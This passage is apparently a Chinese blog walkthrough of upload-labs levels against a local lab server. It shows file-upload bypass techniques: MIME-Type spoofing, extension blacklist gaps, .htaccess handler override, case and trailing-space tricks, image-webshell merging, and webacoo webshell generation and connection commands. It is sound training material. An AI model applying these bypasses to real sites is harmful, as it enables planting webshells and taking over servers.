<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141406254.png" alt="image-20200407141406254"></p>
<p>提交内容，页面返回空白说明正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141521547.png" alt="image-20200407141521547"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141622318.png" alt="image-20200407141622318"></p>
<p>可以使用菜刀连接</p>
<h4 id="upload-labs第绕过MIME-Type验证"><a href="#upload-labs第绕过MIME-Type验证" class="headerlink" title="upload-labs第绕过MIME-Type验证"></a>upload-labs第绕过MIME-Type验证</h4><h5 id="MIME-Type介绍"><a href="#MIME-Type介绍" class="headerlink" title="MIME-Type介绍"></a>MIME-Type介绍</h5><p><em>MIME</em>(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型，是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式</p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在客户端上传文件时，通过Burp Suite抓取数据包，当上传一个php格式的文件时，可以看到数据包中的 Content-Type的值是application/octet-stream，而上传jpg格式的文件时，数据包中的Content-Type的值是image/jpeg</p>
<p>如果服务器代码使用过Content-Type的值来判断文件的类型，那么就存在被绕过的可能，因为Content-Type的值使用过客户端传递的，是可以任意修改的，所以当传一个php文件的时候，在Burp Suite中将Content-Type修改为image/jpeg就可以绕过服务端的检测</p>
<h5 id="注意：是通过客户端传递，服务端检测，是服务端检测"><a href="#注意：是通过客户端传递，服务端检测，是服务端检测" class="headerlink" title="注意：是通过客户端传递，服务端检测，是服务端检测"></a>注意：是通过客户端传递，服务端检测，是服务端检测</h5><h5 id="验证MIME-Type代码分析"><a href="#验证MIME-Type代码分析" class="headerlink" title="验证MIME-Type代码分析"></a>验证MIME-Type代码分析</h5><p>MIME-Type验证并不是发生在客户端验证，而是发生在服务端验证</p>
<p>// $_FILES表示使用了$_FILES全局数组，主要作用就是进行文件操作，例如文件上传时，使用较多<br>// upload_file是我们上传时的文件，也就是表单当中input-type=file对应有一个name，name属性的值用来接收$_FILES[‘upload_file’]这个文件，来调用第二维可以指定对应的type，来获取上传文件的MIME-Type类型</p>
<p>查看源码分析，使用$_FILE[‘uploda_file’] [‘type’]获取上传文件的MIME-Type类型，其中upload_file是在表中定义的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">&#x2F;&#x2F; 判断文件类型，只有符合image&#x2F;jpeg或者image&#x2F;png才能成功成功上传</span><br><span class="line">        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">      &#x2F;&#x2F;当文件类型不是上面判断的类型就会报错</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Burp-Suite绕过MIME-Type验证"><a href="#Burp-Suite绕过MIME-Type验证" class="headerlink" title="Burp Suite绕过MIME-Type验证"></a>Burp Suite绕过MIME-Type验证</h5><p>使用burp抓包，更改Content-type的值</p>
<p>上传php文件Content-type的值是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;octet-stream</span><br></pre></td></tr></table></figure>

<p>需要将Content-Type中的值改为image/jpeg等可以上传的格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407142209535.png" alt="image-20200407142209535"></p>
<p>查看页面，页面返回空白，说明上传成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407142228744.png" alt="image-20200407142228744"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407142309837.png" alt="image-20200407142309837"></p>
<p>可以使用菜刀连接</p>
<h5 id="PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize-可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize-就获取不到信息，则不允许上传。"><a href="#PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize-可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize-就获取不到信息，则不允许上传。" class="headerlink" title="PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。"></a>PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。</h5><h5 id="但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令"><a href="#但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令" class="headerlink" title="但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令"></a>但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat image.png wbeshell.php &gt; image.php</span><br></pre></td></tr></table></figure>

<h5 id="此时使用getimagesize-就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize-的限制。"><a href="#此时使用getimagesize-就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize-的限制。" class="headerlink" title="此时使用getimagesize()就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize()的限制。"></a>此时使用getimagesize()就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize()的限制。</h5><h4 id="绕过黑名单验证"><a href="#绕过黑名单验证" class="headerlink" title="绕过黑名单验证"></a>绕过黑名单验证</h4><h5 id="基于文件后缀名验证介绍"><a href="#基于文件后缀名验证介绍" class="headerlink" title="基于文件后缀名验证介绍"></a>基于文件后缀名验证介绍</h5><p>对于文件上传模块来说，尽量避免上传可执行的脚本文件。为了防止上传脚本需要设置对应的验证方式。最简单的就是设置文件后缀名验证</p>
<p>基于文件后缀名验证方式的分类：</p>
<p>1、机遇白名单验证：只针对白名单中有的后缀名，文件才能上传成功。</p>
<p>2、基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功</p>
<h5 id="基于黑名单验证代码分析"><a href="#基于黑名单验证代码分析" class="headerlink" title="基于黑名单验证代码分析"></a>基于黑名单验证代码分析</h5><p>对于黑名单中的后缀名筛选。绕过黑名单可以通过寻找”漏网之鱼”，寻找某些可以被作为脚本执行同行也不再黑名单中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 设置了四个黑名单后缀名</span><br><span class="line">        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</span><br><span class="line">    &#x2F;&#x2F; 接收当前上传的文件名</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">    &#x2F;&#x2F; 接收之后进行并处理</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line">	&#x2F;&#x2F; 进行判断，如果文件名不在$deny_ext这个黑名单当中，进行上传。</span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 上传之后重命名，命名成跟时间以及随机数相关的内容，这样他就不是原名称，而是全新的名称</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR. &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                 $img_path &#x3D; $UPLOAD_ADDR .&#39;&#x2F;&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                 $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">    	&#x2F;&#x2F; 如果在黑名单当值，执行else，不允许上传</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="BurpSuite绕过黑名单验证"><a href="#BurpSuite绕过黑名单验证" class="headerlink" title="BurpSuite绕过黑名单验证"></a>BurpSuite绕过黑名单验证</h5><p>不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他的任意后缀名的文件，比如说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.phtml .phps .php4 .php3</span><br></pre></td></tr></table></figure>

<p>这里黑名单也没有过滤.htaccess，所以也可上传.htaccess后缀的文件进行绕过。</p>
<h6 id="注-htaccess文件生效前提条件为1-mod-rewrite模块开启。2-AllowOverride-All"><a href="#注-htaccess文件生效前提条件为1-mod-rewrite模块开启。2-AllowOverride-All" class="headerlink" title="注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All"></a><em>注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All</em></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</span><br></pre></td></tr></table></figure>

<h5 id="配置文件http-conf"><a href="#配置文件http-conf" class="headerlink" title="配置文件http.conf"></a>配置文件http.conf</h5><p>在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride</p>
<p>默认情况下红框内会出现None，将None修改为All</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407143520423.png" alt="image-20200407143520423"></p>
<p>这里绕过不使用.htaccess但是提前配置好，使用其他的几个没过滤的文件后缀</p>
<p>使用一下其中一个，当然不止这些扩展名，还有很多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.phtml .phps .php4 .php3</span><br></pre></td></tr></table></figure>

<p>上传php文件使用burp抓包</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145002372.png" alt="image-20200407145002372"></p>
<p>将shell.php改为shell.phps</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145030124.png" alt="image-20200407145030124"></p>
<p>Forward放行，页面返回空白图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145105478.png" alt="image-20200407145105478"></p>
<p>右键选择复制图片地址在浏览器中打开，成功返回结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145158676.png" alt="image-20200407145158676"></p>
<h4 id="绕过黑名单验证-htaccess"><a href="#绕过黑名单验证-htaccess" class="headerlink" title="绕过黑名单验证(.htaccess)"></a>绕过黑名单验证(.htaccess)</h4><p>upload-labs第四关</p>
<h5 id="htaccess文件介绍"><a href="#htaccess文件介绍" class="headerlink" title=".htaccess文件介绍"></a>.htaccess文件介绍</h5><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<p>其中.htaccess文件内容：</p>
<p>SetHandler application/x-httpd-php</p>
<p>设置当前目录所有文件都是用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当做PHP执行。不符合则报错</p>
<h5 id="配置文件http-conf-1"><a href="#配置文件http-conf-1" class="headerlink" title="配置文件http.conf"></a>配置文件http.conf</h5><p>在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride</p>
<p>默认情况下红框内会出现None，将None修改为All</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585712340513.png" alt="1585658574272"></p>
<h5 id="审计黑名单过滤代码"><a href="#审计黑名单过滤代码" class="headerlink" title="审计黑名单过滤代码"></a>审计黑名单过滤代码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 以下为黑名单，不允许的扩展名，对上传进行判定，判定如果在黑名单中，执行下面else，文件不允许上传</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在黑名单中，没有对.htaccess进行过滤，可以直接上传.htaccess来这是使用php解析任意文件。</p>
<p>.htaccess文件内容：SetHandler application/x-httpd-php</p>
<h5 id="制作图片phpinfo探针并上传"><a href="#制作图片phpinfo探针并上传" class="headerlink" title="制作图片phpinfo探针并上传"></a>制作图片phpinfo探针并上传</h5><p>将SetHandler application/x-httpd-php复制到文本另存为.htaccess</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407151641458.png" alt="image-20200407151641458"></p>
<p>页面进行上传，会返回一个空图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585720364221.png" alt="1585719758584"></p>
<p>复制图片链接，打开新的网址，会出现403，会显示</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585719831410.png" alt="1585719740191"></p>
<p>这说明你文件已经上传了，但是你没有权限去访问他</p>
<p>在上传一个图片，图片包含phpinfo探针</p>
<p>使用文本编写php代码</p>
<?php 

​    phpinfo();

?>

<p>保存为1.jpg进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154104175.png" alt="image-20200407154104175"></p>
<p>复制图片地址在浏览器中打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154202446.png" alt="image-20200407154202446"></p>
<h4 id="绕过黑名单验证-大小写绕过"><a href="#绕过黑名单验证-大小写绕过" class="headerlink" title="绕过黑名单验证(大小写绕过)"></a>绕过黑名单验证(大小写绕过)</h4><p>upload-labs第五关</p>
<h5 id="大小写绕过原理"><a href="#大小写绕过原理" class="headerlink" title="大小写绕过原理"></a>大小写绕过原理</h5><p>Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的</p>
<h5 id="基于黑名单验证的代码分析"><a href="#基于黑名单验证的代码分析" class="headerlink" title="基于黑名单验证的代码分析"></a>基于黑名单验证的代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">&#x2F;&#x2F; 黑名单中也没有大小写，例如：如果输入php会被过滤但是输入PhP就不会被过滤</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">    &#x2F;&#x2F; 过滤不包含大小写过滤</span><br><span class="line">        &#x2F;&#x2F; 将上传的文件去空格</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="直接修改后缀名php上传文件件"><a href="#直接修改后缀名php上传文件件" class="headerlink" title="直接修改后缀名php上传文件件"></a>直接修改后缀名php上传文件件</h5><p>以上代码发现大P小h大P(PhP)并没有被过滤，直接修改文件后缀名为PhP进行绕过</p>
<p>文件后缀名不一定必须在BurpSutie截断的HTTP请求中修改，可以直接修改文件后缀名进行上传</p>
<p>用burp将后缀改为大写PHP即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154604250.png" alt="image-20200407154604250"></p>
<p>放行查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154622841.png" alt="image-20200407154622841"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154646284.png" alt="image-20200407154646284"></p>
<h4 id="WebaCoo上传Webshell"><a href="#WebaCoo上传Webshell" class="headerlink" title="WebaCoo上传Webshell"></a>WebaCoo上传Webshell</h4><p>WebaCoo生成Webshell：webacoo -g -o a.php</p>
<p>上传Webshell</p>
<p>连接Webshell：webacoo -t -u Webshell地址</p>
<h5 id="在kali中使用webacoo新建一个a-php文件"><a href="#在kali中使用webacoo新建一个a-php文件" class="headerlink" title="在kali中使用webacoo新建一个a.php文件"></a>在kali中使用webacoo新建一个a.php文件</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154837626.png" alt="image-20200407154837626"></p>
<p>将文件复制到本地文件中，将后缀名改为大小写结合的PhP</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154923154.png" alt="image-20200407154923154"></p>
<p>上传复制会返回空白图片，复制图片连接，在另一个页面打开这个地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585788531529.png" alt="1585786501683"></p>
<p>复制这个地址去kali连接webshell，使用webacoo -t -u “URL”命令</p>
<p>注意：在URL中，因为是从本地copy到kali中的，本地的靶场是127.0.0.1，但在kali中没有127.0.0.1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">webacoo -t -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;a.PhP&quot;</span><br></pre></td></tr></table></figure>

<p>我们需要修改成本地地址<br>打开cmd使用ipconfig查看当前地址，将127.0.0.1改为当前地址，出现这个页面就说明连接成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407155130449.png" alt="image-20200407155130449"></p>
<p>使用ipconfig可以查看本地ip等等</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585786793204.png" alt="1585786724856"></p>
<h4 id="绕过黑名单验证-空格绕过"><a href="#绕过黑名单验证-空格绕过" class="headerlink" title="绕过黑名单验证(空格绕过)"></a>绕过黑名单验证(空格绕过)</h4><h5 id="空格绕过原理"><a href="#空格绕过原理" class="headerlink" title="空格绕过原理"></a>空格绕过原理</h5><p><strong>Winodws系统</strong>下，对于文件名中空格会被作为空处理，程序中的监测代码如果不能自动删除空格，这样就可以利用空格绕过黑名单</p>
<p>针对这样的情况需要使用Burpsuite截断HTTP请求之后，修改对应的文件名 添加空格</p>
<h5 id="基于黑名单验证代码分析-1"><a href="#基于黑名单验证代码分析-1" class="headerlink" title="基于黑名单验证代码分析"></a>基于黑名单验证代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">     #这里并没有使用$file_ext&#x3D;trim($file_ext);来进行收尾去空的操作，可以使用空格绕过</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="BurpSuite绕过黑名单验证-1"><a href="#BurpSuite绕过黑名单验证-1" class="headerlink" title="BurpSuite绕过黑名单验证"></a>BurpSuite绕过黑名单验证</h5><p>利用BurpSuite工具截断HTTP请求，对上传的文件名后加空格</p>
<p>上传一个带有一句话木马的文件，使用BurpSuite抓包，加上空格</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585788446309.png" alt="1585788386815"></p>
<p>forward进行放行，返回空白图，复制图片连接，打开新的页面将其复制运行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407155613012.png" alt="image-20200407155613012"></p>
<p>运行完成后复制地址，打开，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407155801225.png" alt="image-20200407155801225"></p>
